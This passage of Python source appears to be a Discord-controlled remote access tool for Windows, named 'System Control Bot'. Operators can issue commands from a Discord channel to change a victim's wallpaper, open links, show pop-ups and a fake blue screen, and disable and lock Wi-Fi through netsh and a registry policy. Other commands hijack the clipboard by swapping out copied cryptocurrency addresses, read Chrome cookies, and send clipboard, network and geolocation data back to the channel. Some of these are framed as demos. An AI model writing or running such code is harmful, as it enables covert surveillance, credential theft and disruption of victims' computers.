                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Wallpaper Command Error",
                description="Wallpaper change is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        filepath = tempfile.NamedTemporaryFile(delete=False, suffix='.png').name
        await attachment.save(filepath)
        
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, filepath, 3)
        
        embed = create_embed(
            title="Wallpaper Command",
            description="Desktop wallpaper changed successfully.",
            color=discord.Color.purple(),
            status="Success"
        )
        await ctx.send(embed=embed)
        
        os.remove(filepath)
        
    except Exception as e:
        embed = create_embed(
            title="Wallpaper Command Error",
            description=f"Error processing .wallpaper command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def link(ctx, *, url):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Link Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        parsed_url = urlparse(url)
        if not parsed_url.scheme in ('http', 'https'):
            embed = create_embed(
                title="Link Command Error",
                description="Invalid URL. Please provide a valid URL starting with http:// or https://.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        webbrowser.open(url)
        embed = create_embed(
            title="Link Command",
            description=f"Opened URL: {url} in the default browser.",
            color=discord.Color.purple(),
            status="Success"
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Link Command Error",
            description=f"Error processing .link command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def message(ctx, *, text):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Message Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if not text:
            embed = create_embed(
                title="Message Command Error",
                description="No message provided. Usage: .message <text>",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Message Command Error",
                description="Pop-up messages are only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        ctypes.windll.user32.MessageBoxW(0, text, "Alert", 0x40)
        embed = create_embed(
            title="Message Command",
            description=f"Displayed pop-up message: {text}",
            color=discord.Color.purple(),
            status="Success"
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Message Command Error",
            description=f"Error processing .message command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def clipgrab(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages or not perms.attach_files:
            embed = create_embed(
                title="Clipgrab Command Error",
                description="Missing permissions to send messages or attach files.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Clipgrab Command Error",
                description="Clipboard hijacking is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        clipboard_content = pyperclip.paste()
        
        crypto_pattern = r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}'
        if re.match(crypto_pattern, clipboard_content):
            pyperclip.copy("DEMO_HIJACKED_ADDRESS_1234567890")
            clipboard_content += "\n(Replaced with: DEMO_HIJACKED_ADDRESS_1234567890)"
        
        if not clipboard_content:
            embed = create_embed(
                title="Clipgrab Command",
                description="Clipboard is empty.",
                color=discord.Color.purple(),
                status="Success"
            )
            await ctx.send(embed=embed)
            return
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
            temp_file.write(clipboard_content)
            temp_path = temp_file.name
        
        embed = create_embed(
            title="Clipgrab Command",
            description="Clipboard data captured successfully.",
            color=discord.Color.purple(),
            status="Success"
        )
        await ctx.send(embed=embed, file=discord.File(temp_path, "clipboard.txt"))
        
        os.remove(temp_path)
        
    except Exception as e:
        embed = create_embed(
            title="Clipgrab Command Error",
            description=f"Error processing .clipgrab command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def crashfake(ctx):
    global bsod_root
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Crashfake Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Crashfake Command Error",
                description="Fake crash screen is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        def show_fake_bsod():
            global bsod_root
            bsod_root = tk.Tk()
            bsod_root.attributes('-fullscreen', True)
            bsod_root.configure(bg='#0078D7')
            
            frame = tk.Frame(bsod_root, bg='#0078D7')
            frame.pack(expand=True, fill='both', padx=50, pady=50)
            
            tk.Label(
                frame,
                text=":( Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.",
                fg='white', bg='#0078D7', font=('Segoe UI', 20), wraplength=800, justify='left'
            ).pack(anchor='w', pady=20)
            
            tk.Label(
                frame,
                text="0% complete",
                fg='white', bg='#0078D7', font=('Segoe UI', 16)
            ).pack(anchor='w', pady=10)
            
            tk.Label(
                frame,
                text="For more information about this issue and possible fixes, visit https://www.windows.com/stopcode",
                fg='white', bg='#0078D7', font=('Segoe UI', 12), wraplength=800, justify='left'
            ).pack(anchor='w', pady=20)
            
            tk.Label(
                frame,
                text="If you call a support person, give them this info:\nStop code: CRITICAL_PROCESS_DIED",
                fg='white', bg='#0078D7', font=('Segoe UI', 12), justify='left'
            ).pack(anchor='w', pady=10)
            
            qr_frame = tk.Frame(frame, bg='white', width=100, height=100)
            qr_frame.pack(anchor='w', pady=20)
            tk.Label(qr_frame, text="QR Code", fg='black', bg='white', font=('Segoe UI', 10)).place(relx=0.5, rely=0.5, anchor='center')
            
            bsod_root.mainloop()
        
        if bsod_root:
            embed = create_embed(
                title="Crashfake Command Error",
                description="A Blue Screen is already displayed. Use .unbluescreen to close it.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        threading.Thread(target=show_fake_bsod, daemon=True).start()
        time.sleep(0.5)
        if bsod_root:
            embed = create_embed(
                title="Crashfake Command",
                description="Displayed realistic Blue Screen of Death. Use .unbluescreen to close.",
                color=discord.Color.purple(),
                status="Success"
            )
            await ctx.send(embed=embed)
        else:
            embed = create_embed(
                title="Crashfake Command Error",
                description="Failed to display Blue Screen.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Crashfake Command Error",
            description=f"Error processing .crashfake command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def unbluescreen(ctx):
    global bsod_root
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Unbluescreen Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Unbluescreen Command Error",
                description="Blue Screen commands are only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if bsod_root:
            bsod_root.destroy()
            bsod_root = None
            embed = create_embed(
                title="Unbluescreen Command",
                description="Blue Screen of Death closed.",
                color=discord.Color.purple(),
                status="Success"
            )
            await ctx.send(embed=embed)
        else:
            embed = create_embed(
                title="Unbluescreen Command Error",
                description="No Blue Screen is currently displayed.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Unbluescreen Command Error",
            description=f"Error processing .unbluescreen command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def sessionsteal(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages or not perms.attach_files:
            embed = create_embed(
                title="Sessionsteal Command Error",
                description="Missing permissions to send messages or attach files.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Sessionsteal Command Error",
                description="Session stealing is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        try:
            chrome_cookies = browsercookie.chrome()
            demo_cookies = []
            for cookie in chrome_cookies:
                if 'localhost' in cookie.domain:
                    demo_cookies.append(f"{cookie.name}: {cookie.value} (Domain: {cookie.domain})")
            
            cookie_data = "\n".join(demo_cookies) if demo_cookies else "No demo cookies found for localhost."
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
                temp_file.write(cookie_data)
                temp_path = temp_file.name
            
            embed = create_embed(
                title="Sessionsteal Command",
                description="Demo session cookies captured for localhost.",
                color=discord.Color.purple(),
                status="Success"
            )
            await ctx.send(embed=embed, file=discord.File(temp_path, "session_cookies.txt"))
            
            os.remove(temp_path)
            
        except Exception as e:
            embed = create_embed(
                title="Sessionsteal Command Error",
                description=f"Error accessing browser cookies: {e}",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Sessionsteal Command Error",
            description=f"Error processing .sessionsteal command: {str(e)}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def ip(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages or not perms.attach_files:
            embed = create_embed(
                title="IP Command Error",
                description="Missing permissions to send messages or attach files.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="IP Command Error",
                description="IP configuration retrieval is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        public_ip = "Unable to fetch"
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except Exception as e:
            embed = create_embed(
                title="IP Command Error",
                description=f"Error fetching public IP: {str(e)}",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
        
        network_info = []
        network_info.append(f"**Network Information for {device_name}**")
        
        interfaces = psutil.net_if_addrs()
        for interface, addrs in interfaces.items():
            network_info.append(f"\nInterface: {interface}")
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    network_info.append(f"  IP: {addr.address}")
                    network_info.append(f"  Netmask: {addr.netmask}")
                    if addr.broadcast:
                        network_info.append(f"  Broadcast: {addr.broadcast}")
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            network_info.append(f"\nEstimated Local IP (Gateway): {local_ip}")
            s.close()
        except Exception:
            network_info.append("\nEstimated Local IP: Unable to determine")
        
        network_data = "\n".join(network_info)
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
            temp_file.write(network_data)
            temp_path = temp_file.name
        
        embed = create_embed(
            title="IP Command",
            description=f"Public IP: {public_ip}\nLocal network configuration captured.",
            color=discord.Color.purple(),
            status="Success"
        )
        await ctx.send(embed=embed, file=discord.File(temp_path, "network_info.txt"))
        
        os.remove(temp_path)
        
    except Exception as e:
        embed = create_embed(
            title="IP Command Error",
            description=f"Error processing .ip command: {str(e)}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def geolocation(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Geolocation Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Geolocation Command Error",
                description="Geolocation is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except Exception as e:
            embed = create_embed(
                title="Geolocation Command Error",
                description=f"Error fetching public IP: {str(e)}",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        try:
            response = requests.get(f'http://ip-api.com/json/{public_ip}', timeout=5)
            data = response.json()
            
            if data.get('status') != 'success':
                embed = create_embed(
                    title="Geolocation Command Error",
                    description=f"Error retrieving geolocation: {data.get('message', 'Unknown error')}",
                    color=discord.Color.red(),
                    status="Failed"
                )
                await ctx.send(embed=embed)
                return
            
            lat = data.get('lat')
            lon = data.get('lon')
            
            if lat is None or lon is None:
                embed = create_embed(
                    title="Geolocation Command Error",
                    description="Geolocation data unavailable.",
                    color=discord.Color.red(),
                    status="Failed"
                )
                await ctx.send(embed=embed)
                return
            
            maps_url = f"https://www.google.com/maps?q={lat},{lon}"
            embed = create_embed(
                title="Geolocation Command",
                description=f"Approximate location (city-level): {maps_url}\nNote: This is an estimate based on your public IP, not your exact household location.",
                color=discord.Color.purple(),
                status="Success"
            )
            await ctx.send(embed=embed)
        
        except Exception as e:
            embed = create_embed(
                title="Geolocation Command Error",
                description=f"Error processing .geolocation command: {str(e)}",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Geolocation Command Error",
            description=f"Error processing .geolocation command: {str(e)}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def boot_offline(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Boot Offline Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Boot Offline Command Error",
                description="Wi-Fi disabling is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        try:
            subprocess.run('netsh wlan disconnect', shell=True, check=True, capture_output=True)
        except subprocess.CalledProcessError as e:
            embed = create_embed(
                title="Boot Offline Command Error",
                description=f"Error disconnecting Wi-Fi: {e.stderr.decode()}",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        try:
            subprocess.run('netsh interface set interface "Wi-Fi" admin=disable', shell=True, check=True, capture_output=True)
        except subprocess.CalledProcessError as e:
            embed = create_embed(
                title="Boot Offline Command Error",
                description=f"Error disabling Wi-Fi adapter: {e.stderr.decode()}",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        try:
            reg_path = r"SOFTWARE\Policies\Microsoft\Windows\Network Connections"
            reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
            winreg.SetValueEx(reg_key, "NC_ShowSharedAccessUI", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(reg_key)
        except Exception as e:
            embed = create_embed(
                title="Boot Offline Command Error",
                description=f"Error locking Wi-Fi settings (admin required): {str(e)}",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        embed = create_embed(
            title="Boot Offline Command",
            description="Wi-Fi disabled and locked until device restart.",
            color=discord.Color.purple(),
            status="Success"
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Boot Offline Command Error",
            description=f"Error processing .boot-offline command: {str(e)}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

def display_banner():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')
    
    banner = """
    ===============================
           System Control Bot
    ===============================
    
    Initializing commands...
    Ready for operation.
    
    ===============================
    \  |  / xavlenia \  |  /
    ===============================
    """
    print(banner)

display_banner()

bot.run('YOUR_BOT_TOKEN')
